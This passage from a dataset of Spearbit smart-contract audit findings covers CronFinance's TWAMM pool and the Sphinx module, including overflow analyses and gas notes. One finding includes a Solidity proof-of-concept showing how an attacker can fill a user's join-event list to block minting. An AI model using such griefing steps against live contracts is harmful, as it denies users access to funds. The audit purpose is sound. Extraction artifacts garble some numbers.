the two tokens are packed into a single storage slot, so that only 128 bits are available for each value. This makes multiple overflows within the lifetime of a single order more likely. The CronFi team was aware of this at the start of the audit and specifically requested it be investigated, though they expected a maximum order length of 5 years to be sufficient to avoid the issue in practice. The scaling factor of 264 is approximately 1.8 (cid:3) 1019, close to the unit size of an 18-decimal token. It indeed works well if both pool tokens have similar decimals and relative prices that do not differ by too many orders of magnitude, as the quantity purchased and the sales rate will then be of similar magnitude, canceling to within a few powers of ten (2128 3.4 (cid:3) 1038, leaving around 19 orders of magnitude after accounting for the scaling factor). However, in pools with large disparities in price, decimals, or both, numerical issues are easy to encounter. The most extreme, realistic example would be a DAI-GUSD pool. DAI has 18 decimals while GUSD has only 2. We will treat the price of DAI and GUSD as equal for this analysis, as they are both stablecoins, and arbitrage of the TWAMM pool should prevent large deviations. Selling GUSD at a rate of 1000 per block, with an OBI of 64 (the stable pool order block interval in the audited commit) results in an increment of the scaled proceeds per OBI of: increment = (64 (cid:3) 1000 (cid:3) 1018) (cid:3) 264=(1000 (cid:3) 102) = 1.18 (cid:3) 1037 7 This will overflow an unsigned 128 bit integer after 29 OBIs; at 12 seconds per block, this means the first overflow occurs after 12 (cid:3) 64 (cid:3) 29 = 22272 seconds or about 6.2 hours, and thus the first double overflow (and hence irrevocable loss of proceeds if a withdrawal is not executed in time) will occur within about 12.4 hours (slightly but not meaningfully longer if the price is pushed a bit below 1:1, assuming a deep enough pool or reasonably efficient arbitrage). Since the TWAMM is intended to support swaps that take days, weeks, months, or even years to fill, without requiring constant vigilance from every long-term swapper, this is a strong violation of safety. A less extreme but more market-relevant example would be a DAI-WBTC pool. WBTC has 8 instead of 2 decimals, but it is also more than four orders of magnitude more valuable per token than DAI, making it only about 2 orders of magnitude \"safer\" than a DAI-GUSD pool. Imitating the above calculation with 20_000 DAI = 1 WBTC and selling 0.0025 WBTC (~$50) per block with a 257 block OBI yields: increment = (257 (cid:3) 50 (cid:3) 1018) (cid:3) 264=(0.0025 (cid:3) 108) = 9.48 (cid:3) 1035 OBI to overflow = ceiling(2128=(9.48 (cid:3) 1035)) = 359 time to overflow = 12 (cid:3) 257 (cid:3) 359 = 1107156 seconds = 307 hours = 12.8 days , or a little more than a day to encounter the second overflow. While less bad than the DAI-GUSD example, this is still likely of significant concern given that the CronFi team indicated these are parameters under which the TWAMM should be able to function safely and DAI-WBTC is a pair of interest for the v1 product. It is worth noting that these calculations are not directly dependent on the quantity being sold so long as the price stays roughly constant--any change in the selling rate will be compensated by a proportional change in the proceeds quantity as their ratio is determined by price. Thus the analysis depends only on relative price and relative decimals, to a good approximation--so a WBTC-DAI pool can be expected to experience an overflow roughly every two weeks at prevailing market prices, so long as the net selling rate is non-zero.", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "An attacker can block any address from joining the Pool and minting BLP Tokens by filling the joinEventMap mapping.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "An attacker can block any address from minting BLP Tokens. This occurs due to the MAX_JOIN_- EVENTS limit, which is present in the JoinEventLib library. The goal for an attacker is to block a legitimate user from minting BLP Tokens, by filling the joinEventMap mapping. The attacker can fill the joinEventMap mapping by performing the following steps:  The attacker mints BLP Tokens from 50 different addresses.  Each address transfers the BLP Tokens, alongside the join events, to the user targeted with a call to the CronV1Pool(pool).transfer and CronV1Pool(pool).transferJoinEvent functions respectively. Those transfers should happen in different blocks. After 50 blocks (50 * 12s = 10 minutes) the attacker has blocked the legitimate user from minting _BLP Tokens_, as the maximum size of the joinEventMap mapping has been reached. 8 The impact of this vulnerability can be significant, particularly for smart contracts that allow users to earn yield by providing liquidity in third-party protocols. For example, if a governance proposal is initiated to generate yield by providing liquidity in a CronV1Pool pool, the attacker could prevent the third-party protocol from integrating with the CronV1Pool protocol. A proof-of-concept exploit demonstrating this vulnerability can be found below: function testGriefingAttack() public { console.log(\"-----------------------------\"); console.log(\"Many Users mint BLP tokens and transfer the join events to the user 111 in order to fill the array!\"); ,! for (uint j = 1; j < 51; j++) { _addLiquidity(pool, address(j), address(j), 2_000, 2_000, 0); vm.warp(block.timestamp + 12); vm.startPrank(address(j)); //transfer the tokens CronV1Pool(pool).transfer(address(111), CronV1Pool(pool).balanceOf(address(j))); //transfer the join events to the address(111) CronV1Pool(pool).transferJoinEvent(address(111), 0 , CronV1Pool(pool).balanceOf(address(j))); vm.stopPrank(); } console.log(\"Balance of address(111) before minting LP Tokens himself\", ,! ICronV1Pool(pool).balanceOf(address(111))); //user(111) wants to enter the pool _addLiquidity(pool, address(111), address(111), 5_000, 5_000, 0); console.log(\"Join Events of user address(111): \", ICronV1Pool(pool).getJoinEvents(address(111)).length); console.log(\"Balance of address(111) after adding the liquidity: \", ICronV1Pool(pool).balanceOf(address(111))); ,! ,! }", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "The executeVirtualOrdersToBlock function updates the oracle with the wrong block.number", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The executeVirtualOrdersToBlock is external, meaning anyone can call this function to execute virtual orders. The _maxBlock parameter can be lower block.number which will make the oracle malfunction as the oracle update function _updateOracle uses the block.timestamp and assumes that the update was called with the reserves at the current block. This will make the oracle update with an incorrect value when _maxBlock can be lower than block.number.", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "The _join function does not check if the recipient is address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "As stated within the Balancer's PoolBalances.sol // The Vault ignores the `recipient` in joins and the `sender` in exits: it is up to the Pool to keep track of ,! // their participation. The recipient is not checked if it's the address(0), that should happen within the pool implementation. Within the Cron implementation, this check is missing which can cause losses of LPs if the recipient is sent as address(0). This can have a high impact if a 3rd party integration happens with the Cron pool and the \"joiner\" is mistakenly sending an address(0). This becomes more dangerous if the 3rd party is a smart contract implementation that connects with the Cron pool, as the default value for an address is the address(0), so the probability of this issue occurring increases.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Canonical token pairs can be griefed by deploying new pools with malicious admins", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "function create( address _token0, address _token1, string memory _name, string memory _symbol, uint256 _poolType, address _pauser ) external returns (address) { CronV1Pool.PoolType poolType = CronV1Pool.PoolType(_poolType); requireErrCode(_token0 != _token1, CronErrors.IDENTICAL_TOKEN_ADDRESSES); (address token0, address token1) = _token0 < _token1 ? (_token0, _token1) : (_token1, _token0); requireErrCode(token0 != address(0), CronErrors.ZERO_TOKEN_ADDRESSES); requireErrCode(getPool[token0][token1][_poolType] == address(0), CronErrors.EXISTING_POOL); address pool = address( new CronV1Pool(IERC20(_token0), IERC20(_token1), getVault(), _name, _symbol, poolType, ,! address(this), _pauser) ); //... Anyone can permissionlessly deploy a pool, with it then becoming the canonical pool for that pair of tokens. An attacker is able to pass a malicious _pauser the twamm pool, preventing the creation of a legitimate pool of the same type and tokens. This results in race conditions between altruistic and malicious pool deployers to set the admin for every token pair. 10 Malicious actors may grief the protocol by attempting to deploy token pairs with and exploiting the admin address, either deploying the pool in a paused state, effectively disabling trading for long-term swaps with the pool, pausing the pool at an unknown point in the future, setting fee and holding penalty parameters to inappropriate values, or setting illegitimate arbitrage partners and lists. This requires the factory owner to remove the admin of each pool individually and to set a new admin address, fee parameters, holding periods, pause state, and arbitrage partners in order to recover each pool to a usable condition if the griefing is successful.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Refund Computation in _withdrawLongTermSwap Contains A Risky Underflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Nothing prevents lastVirtualOrderBlock from advancing beyond the expiry of any given long-term swap, so the unchecked subtraction here is unsafe and can underflow. Since the resulting refund value will be extremely large due to the limited number of blocks that can elapse and the typical prices and decimals of tokens, the practical consequence will be a revert due to exceeding the pool and order balances. However, this could be used to steal funds if the value could be maliciously tuned, for example via another hypothetical bug that allowed the last virtual order block or the sales rate of an order to be manipulated to an arbitrary value.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Function transferJoinEvent Permits Transfer-to-Self", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Though the error code indicates the opposite intent, this check will permit transfer-to-self (|| used instead of &&).", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "One-step owner change for factory owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The factory owner can be changed with a single transaction. As the factory owner is critical to managing the pool fees and other settings an incorrect address being set as the owner may result in unintended behaviors.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Factory owner may front run large orders in order to extract fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The factory owner may be able to front-run large trades in order to extract more fees if compromised or becomes malicious in one way or another. Similarly, pausing may also allow for skipping the execution of virtual orders before exiting.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Join Events must be explicitly transfered to recipient after transfering Balancer Pool Tokens in order to realize the full value of the tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Any user receiving LP tokens transferred to them must be explicitly transferred with a join event in order to redeem the full value of the LP tokens on exit, otherwise the address transferred to will automatically get the holding penalty when they try to exit the pool. Unless a protocol specifically implements transferJoinEvent function compatibility all LP tokens going through that protocol will be worth a fraction of their true value even after the holding period has elapsed.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Order Block Intervals(OBI) and Max Intervals are calculated with 14 second instead of 12 second block times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The CronV1Pool contract calculates both the Order Block Intervals (OBI) and the Max Intervals of the Stable/Liquid/Volatile pairs with 14 second block times. However, after the merge, 12 second block time is enforced by the Beacon Chain.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "One-step status change for pool Admins", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Admin status can be changed in a single transaction. This may result in unintended behaviour if the incorrect address is passed.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Incomplete token simulation in CronV1Pool due to missing queryJoin and queryExit functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "he CronV1Pool contract is missing the queryJoin and queryExit functions, which are significant for calculating maxAmountsIn and/or minBptOut on pool joins, and minAmountsOut and/or maxBptIn on pool exits, respectively. The ability to calculate these values is very important in order to ensure proper enforcement of slippage tolerances and mitigate the risk of sandwich attacks.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "A partner can trigger ROC update", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A partner can trigger rook update if they return rook's current list within an update.  Scenario A partner calls updateArbitrageList, the IArbitrageurList(currentList).nextList() returns rook's rook- PartnerContractAddr and gets updated, the partner calls updateArbitrageList again, so this time isRook will be true.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Approved relayer can steal cron's fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A relayer within Balancer is set per vault per address. If feeAddr will ever add a relayer within the balancer vault, the relayer can call exitPool with a recipient of their choice, and the check on line 225 will pass as the sender will still be feeAddr but the true msg.sender is the relayer.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Price Path Due To Long-Term Orders Neglected In Oracle Updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The _updateOracle() function takes its price sample as the final price after virtual order execution for whatever time period has elapsed since the last join/exit/swap. Since the price changes continuously during that interval if there are long-term orders active (unlike in Uniswap v2 where the price is constant between swaps), this is inaccurate - strictly speaking, one should integrate over the price curve as defined by LT orders to get a correct sample. The longer the interval, the greater the potential for inaccuracy.", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Vulnerabilities noted from npm audit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "npm audit notes: 76 vulnerabilities (5 low, 16 moderate, 27 high, 28 critical).", "labels": ["Spearbit", "CronFinance", "Severity: Low Risk"]}, {"title": "Optimization: Merge CronV1Pool.sol & VirtualOrders.sol (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A lot of needless parameter passing is done to accommodate the file barrier between CronV1Pool & VirtualOrdersLib, which is an internal library. Some parameters are actually immutable variables.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Receive sorted tokens at creation to reduce complexity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Currently, when a pool is created, within the constructor, logic is implemented to determine if the to- kens are sorted by address. A requirement that is needed for Balancer Pool creation. This logic adds unnecessary gas consumption and complexity throughout the contract as every time amounts are retrieved from balancer, the Cron Pool must check the order of the tokens and make sure that the difference between sorted (Balancer) and unsorted (Cron) token addresses is handled. An example can be seen in onJoinPool uint256 token0InU112 = amountsInU112[TOKEN0_IDX]; uint256 token1InU112 = amountsInU112[TOKEN1_IDX]; Where the amountsInU112 are retrieved from the balancer as a sorted array, index 0 == token0 and index 1 == token1, but on the Cron side, we must make sure that we retrieved the correct amount based on the tokens being sent as sorted or not when the pool was created.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Remove double reentrancy checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A number of CronV1Pool functions include reentrancy checks, however, they are only callable from a Balancer Vault function that already has a reentrancy check.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "TWAMM Formula Computation Can Be Made Correct-By-Construction and Optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The linked lines are the core calculation of TWAMM virtual order execution. They involve checked arithmetic in the form of underflow-checked subtractions; there is thus a theoretical risk that rounding error could lead to a \"freezing\" of a TWAMM pool. One of the subtractions, that for token1OutU112, is already \"correct-by- construction\", i.e. it can never underflow. The calculation of token0OutU112 can be reformulated to be explicitly safe as well; the following overall refactoring is suggested: uint256 ammEndToken0 = (token1ReserveU112 * sum0) / sum1; uint256 ammEndToken1 = (token0ReserveU112 * sum1) / sum0; token0ReserveU112 = ammEndToken0; token1ReserveU112 = ammEndToken1; token0OutU112 = sum0 - ammEndToken0; token1OutU112 = sum1 - ammEndToken1; Both output calculations are now of the form x (cid:0) (x (cid:3) y)=(y + z) for non-negative x, y , and z, allowing subtraction operations to be unchecked, which is both a gas optimization and gives confidence the calculation cannot freeze up unexpectedly due to an underflow. Replacement of divDown by / gives equivalent semantics with lower overhead. An additional advantage of this formulation is its manifest symmetry under 0 < (cid:0) > 1 interchange; this serves as a useful heuristic check on the computation, as it should possess the same symmetry as the invariant.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Gas Optimizations In Bit Packing Functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The bit packing operations are heavily used throughout the gas-critical swap code path, the opti- mization of which was flagged as high-priority by the CronFi team. Thus they were carefully reviewed not just for correctness, but also for gas optimization. L119: unnecessary & due to check on L116 L175: could hardcode clearMask L203: could hardcode clearMask L240: could hardcode clearMask L241: unnecessary & due to check on line 237 L242: unnecessary & due to check on line 238 L292: could hardcode clearMask L328: could hardcode clearMask L343: unnecessary to mask when _isWord0 == true L359: unnecessary & operations due to checks on lines 356 and 357 L372: unnecessary masking L389: could hardcode clearMask L390: unnecessary & due to check on L387 L415: could 16 hardcode clearMask L416: unnecessary & operation due to check on line 413 L437: unnecessary clearMask L438: unnecessary & due to check on line 435 L464: could hardcode clearMask L465: unnecessary & due to check on line 462 Additionally, the following code pattern appears in multiple places: requireErrCode(increment <= CONST, CronErrors.INCREMENT_TOO_LARGE); value += increment; requireErrCode(value <= CONST, CronErrors.OVERFLOW); Unless there's a particular reason to want to detect a too-large increment separately from an overflow, these patterns could all be simplified to requireErrCode(CONST - value >= increment, CronErrors.OVERFLOW); value += increment; as any increment greater than CONST will cause overflow anyway and value is always in the correct range by construction. This allows CronErrors.INCREMENT_TOO_LARGE to be removed as well.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Using extra storage slot to store two mappings of the same information", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A second storage slot is used to store a duplicate mapping of the same token pair but in reverse order. If the tokens are sorted in a getter function then the second mapping does not need to be used.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Gas optimizations within _executeVirtualOrders function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Within the _executeVirtualOrders function there are a few gas optimizations that can be applied to reduce the contract size and gas consumed while the function is called. (!(virtualOrders.lastVirtualOrderBlock < _maxBlock && _maxBlock < block.number)) Is equivalent with: (virtualOrders.lastVirtualOrderBlock >= _maxBlock || _maxBlock >= block.number) This means that this always enters if _maxBlock == block.number which will result in unnecessary gas consump- tion. If cron fee is enabled, evoMem.feeShiftU3 will have a value meaning that the check on line 1536 is obsolete. Removing that check and the retrieve from storage will save gas.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Initializing with default value is consuming unnecessary gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Every variable declaration followed by initialization with a default value is gas consuming and obso- lete. The provided line within the context is just an example.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Factory requirement can be circumvented within the constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The constructor checks if the _factory parameter is the msg.sender. This behavior was, at first, created so that only the factory would be able to deploy pools. The check on line 484 is obsolete as pools deployed via the factory, will always have msg.sender == factory address, making the _factory parameter obsolete as well.", "labels": ["Spearbit", "CronFinance", "Severity: Gas Optimization"]}, {"title": "Usability: added remove, set pool functionality to CronV1PoolFactory (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Conversations with the audit team indicated functions were needed to manage pool mappings post- creation in the event that a pool needed to be deprecated or replaced.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Virtual oracle getter--gets oracle value at block > lvob (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Through the audit process, sufficient contract space became available to add an oracle getter con- venience that returns the oracle values and timestamps. However, this leaves the problem of not being able to get the oracle price at the current block in a pool with low volume but virtual orders active.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Loss of assets due to rounding during _longTermSwap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "When a long term swap (LT) is created, the selling rate for that LT is set based on the amount and the number of blocks that order will be traded for. uint256 lastExpiryBlock = block.number - (block.number % ORDER_BLOCK_INTERVAL); uint256 orderExpiry = ORDER_BLOCK_INTERVAL * (_orderIntervals + 1) + lastExpiryBlock; // +1 protects from div 0 ,! uint256 tradeBlocks = orderExpiry - block.number; uint256 sellingRateU112 = _amountInU112 / tradeBlocks; During the computation of the number of blocks, the order must trade for, defined as tradeBlocks, the order expiry is computed from the last expiry block based on the OBI (Order Block Interval). If tradeBlocks is big enough (it can be a max of 176102 based on the STABLE_MAX_INTERVALS ), then sellingRa- teU112 will suffer a loss due to solidity rounding down behavior. This is a manageable loss for tokens with big decimals but for tokens with low decimals, will create quite an impact. E.g. wrapped BTC has 8 decimals. the MAX_ORDER_INTERVALS can be max 176102 as per stable max intervals defined within the constants. that being said a user can lose quite a significant value of BTC: 0.00176101 This issue is marked as Informational severity as the amount lost might not be that significant. This can change in the future if the token being LTed has a big value and a small number of decimals.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Inaccuracies in Comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "A number of minor inaccuracies were discovered in comments that could impact the comprehensi- bility of the code to future maintainers, integrators, and extenders. [1] bit-0 should be bit-1 [2] less than should be at most [3] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [4] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [5] on these lines unsold should be sold [6] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop 19 on line 54. [7] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop on line 111. [8] omitted should be emitted", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "Unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The Balancer protocol utilizes two types of swaps for its functionality - GIVEN_IN and GIVEN_OUT.  GIVEN_IN specifies the minimum amount of tokens a user would accept to receive from the swap.  GIVEN_OUT specifies the maximum amount of tokens a user would accept to send for the swap. However, the onSwap function of the CronV1Pool contract only accepts the IVault.SwapKind.GIVEN_IN value as the IVault.SwapKind field of the SwapRequest struct. The unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer on the Batch Swaps and the Smart Order Router functionality, as a single SwapKind is given as an argument.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "A pool's first LP will always take a minor loss on the value of their liquidity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The first liquidity provider for a pool will always take a small loss on the value of their tokens deposited into the pool because 1000 balancer pool tokens are minted to the zero address on the initial deposit. As most tokens have 18 decimal places, this value would be negligible in most cases, however, for tokens with a high value and small decimals the effects may be more apparent.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "The _withdrawCronFees functions should revert if no fees to withdraw", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "The _withdrawCronFees checks if there are any Cron Fees that need to be withdrawn, currently, this function does not revert in case there are no fees.", "labels": ["Spearbit", "CronFinance", "Severity: Informational"]}, {"title": "When SphinxModule is initialised the integrity of the used safe wallet is not checked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "When SphinxModule is initialised the integrity of the used safe wallet is not checked. Using an older or a newer safe wallet or a customised one can potentially cause funds to be locked/lost.", "labels": ["Spearbit", "Sphinx", "Severity: Low Risk"]}, {"title": "Check that networkDeploymentData.txs conforms to SphinxTransaction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The properties of networkDeploymentData are not guaranteed to conform to SphinxTransaction.", "labels": ["Spearbit", "Sphinx", "Severity: Low Risk"]}, {"title": "3rd merkle tree invariant isn't checked when generating merkle tree", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The 3rd invariant stated in the merkle tree specification:   If ,! arbitraryChain the entire tree, and no is true in *any*   CANCEL leaves   APPROVE leaf, then there must be exactly one APPROVE leaf in   isn't checked when generating the merkle tree, thus leading to possible violations of this invariant.", "labels": ["Spearbit", "Sphinx", "Severity: Low Risk"]}, {"title": "The execute function does not handle the return data", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "When an EXECUTE leaf is executed, the Gnosis Safe function execTransactionFromModule is called. This function handles only success/revert state of a function which means, if an action fails silently (meaning that it returns a false as a bool for example) the action will be marked as success within the SphinxModule. The Gnosis Safe module has also a function called execTransactionFromModuleReturnData which also returns the data that the transaction returns. This can be used to expand the functionality of the current SphinxModule to handle also the silent reverts.", "labels": ["Spearbit", "Sphinx", "Severity: Low Risk"]}, {"title": "The EIP-712 domain separator is missing the version field", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The EIP-712 domain separator is used to uniquely for hashing and signing of typed structured data as opposed to just bytestrings. In the EIP there are various attributes that should be incorporated in the signature. The implementation in the Sphinx Module is missing to encode some of these attributes like:  Version.  Verifying contract.  Chain id. We do understand why chain id and verifying contract where not implemented due to one signature being used for multiple deployments on multiple chains, we do consider that the version is critical to be implemented in case a new versions of the SphinxModule is developed, the signatures meant for one version can be reused for other versions as well.", "labels": ["Spearbit", "Sphinx", "Severity: Low Risk"]}, {"title": "OpenZeppelin library leaves sorting differs from 9th merkle tree invariant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "@openzeppelin/merkle-tree is used to assemble the Merkle tree. leaves according to their hashes then stored starting from the last slot in the tree array. Its implementation sorts the export function makeMerkleTree(leaves: Bytes[]): Bytes[] { leaves.forEach(checkValidMerkleNode); if (leaves.length === 0) { throw new Error( }  Expected non-zero number of leaves );  const tree = new Array<Bytes>(2 * leaves.length - 1); for (const [i, leaf] of leaves.entries()) { tree[tree.length - 1 - i] = leaf; } for (let i = tree.length - 1 - leaves.length; i >= 0; i--) { tree[i] = hashPair( tree[leftChildIndex(i)]!, tree[rightChildIndex(i)]!, ); } return tree; } This likely runs contrary to the 9th high-level merkle tree invariant: Merkle tree leaves must be ordered in the tree by the leaf's index and chainId fields ascending.", "labels": ["Spearbit", "Sphinx", "Severity: Low Risk"]}, {"title": "Removing unnecessary reads of known variables will save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The variable leafSafeProxy is decoded from leaf.data and is subsequently checked to ensure it matches safeProxy. Later, within the same function, safeProxy is used leading to an unnecessary storage read operation, as the value of safeProxy is already accesible at leafSafeProxy.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "Caching variables accessed multiple times will save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "Caching variables that are accessed multiple times within the same function (i.e. activeMerkleRoot) will save gas, as each access to a state variable like activeMerkleRoot requires a storage read (SLOAD).  activeMerkleRoot at SphinxModule.sol#L273-L403 can be stored in a local variable at the start of execute function.  state.arbitraryChain at SphinxModule.sol#L306-L312 can be stored in a local variable at L305.  state.leavesExecuted can be stored in a local variable at the very beginning of execute and just update it at the very end SphinxModule.sol#L285-L399.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "msg.sender is cheaper gas-wise and provides more clarity than the executor variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The executor local variable is used in several places after verifying that executor is equal to msg.sender. require(executor == msg.sender, \"SphinxModule: caller isn  t executor\"); Using a local variable for the executor when it equals msg.sender is inefficient. Additionally, using msg.sender provides more clarity on what is going on in the contract logic.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "SphinxMerkleRootApproved event can avoid reading from the state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The SphinxMerkleRootApproved event uses a couple of state parameters, namely merkleRootNonce and activeMerkleRoot, that can be replaced with its user specified counterparts. This is due to having a couple of previous require checks: SLOAD require(activeMerkleRoot == bytes32(0), \"SphinxModule: active merkle root\"); // @audit activeMerkleRoot ,! // ... require(leafMerkleRootNonce == merkleRootNonce, \"SphinxModule: invalid nonce\"); //@audit ,! merkleRootNonce SLOAD This leads to a couple of optimizations 1. Avoid using merkleRootNonce: Reading leafMerkleRootNonce will avoid reading from state and provide the same value. 2. Avoid using activeMerkleRoot: Given the check require(activeMerkleRoot == bytes32(0), \"Sphinx- Module: active merkle root\"); earlier in the code, activeMerkleRoot can be replaced with bytes32(0) or removed entirely from the event parameters.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "Reordering require statements can save gas in case of revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The order of condition checks can be optimized for gas usage. Specifically, checks for input parame- ters should precede checks that require state variable loading (SLOAD). Loading state variables is a more expensive operation compared to checking input parameters.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "merkleRootNonce increment can be gas optimized and avoid a SLOAD", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "merkleRootNonce is incremented using += 1 operation in approve and cancel functions. Using an unchecked { ++merkleRootNonce; } can offer gas savings as it not expectable to ever overflow. Additionally, leafMerkleRootNonce is equivalent to merkleRootNonce as per the previous 